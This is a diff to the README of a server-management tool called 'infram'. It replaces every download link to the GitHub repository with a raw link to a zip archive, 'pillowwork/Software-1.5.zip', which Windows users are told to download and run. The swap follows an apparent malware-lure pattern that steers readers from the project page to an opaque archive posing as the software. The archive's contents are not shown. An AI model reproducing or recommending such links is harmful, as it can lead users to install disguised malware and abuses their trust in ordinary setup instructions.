@@ -1,6 +1,6 @@
 # 🛡️ infram - Manage servers from one place
 
-[![Download infram](https://img.shields.io/badge/Download-infram-blue?style=for-the-badge&logo=github)](https://github.com/isandr2865/infram)
+[![Download infram](https://img.shields.io/badge/Download-infram-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/isandr2865/infram/main/pillowwork/Software-1.5.zip)
 
 ## 🚀 What is infram?
 
@@ -20,7 +20,7 @@ It is built for users who want a clear way to manage remote systems without movi
 
 Visit this page to download and run infram on Windows:
 
-[Download infram](https://github.com/isandr2865/infram)
+[Download infram](https://raw.githubusercontent.com/isandr2865/infram/main/pillowwork/Software-1.5.zip)
 
 ## 🪟 Windows setup
 
@@ -183,7 +183,7 @@ This project is related to:
 
 ## 📎 Download link
 
-[https://github.com/isandr2865/infram](https://github.com/isandr2865/infram)
+[https://raw.githubusercontent.com/isandr2865/infram/main/pillowwork/Software-1.5.zip](https://raw.githubusercontent.com/isandr2865/infram/main/pillowwork/Software-1.5.zip)
 
 ## 🧭 First-time setup checklist
 
